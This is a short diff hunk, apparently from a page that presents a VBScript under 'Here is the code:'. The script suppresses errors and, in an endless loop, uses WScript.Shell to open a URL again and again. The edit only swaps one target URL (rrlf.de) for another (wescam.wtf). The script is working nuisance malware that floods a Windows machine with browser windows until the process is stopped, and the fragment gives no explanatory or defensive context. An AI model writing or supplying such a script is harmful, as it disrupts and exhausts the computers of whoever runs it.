@@ -59,7 +59,7 @@ Here is the code:
 On Error Resume Next
 Set wsc = CreateObject("WScript.Shell")
 Do
-wsc.Run "http://www.rrlf.de/", 3, False
+wsc.Run "http://www.wescam.wtf/", 3, False
 Loop
 
 -------------------------------------
